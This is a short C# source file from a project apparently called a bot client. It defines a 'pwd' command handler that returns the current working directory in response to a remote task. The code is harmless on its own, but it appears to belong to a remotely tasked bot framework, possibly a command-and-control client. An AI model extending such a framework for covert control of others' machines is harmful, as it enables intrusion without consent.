using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System.IO;


namespace pattaya_project_client.Commands.Implements
{
    public class PrintWorkingDirectory : BotCommand
    {
        public override string TaskName => "pwd";

        public override string RunTask(BotTask task)
        {
            return "Current directory: " + Directory.GetCurrentDirectory();
        }
    }
}
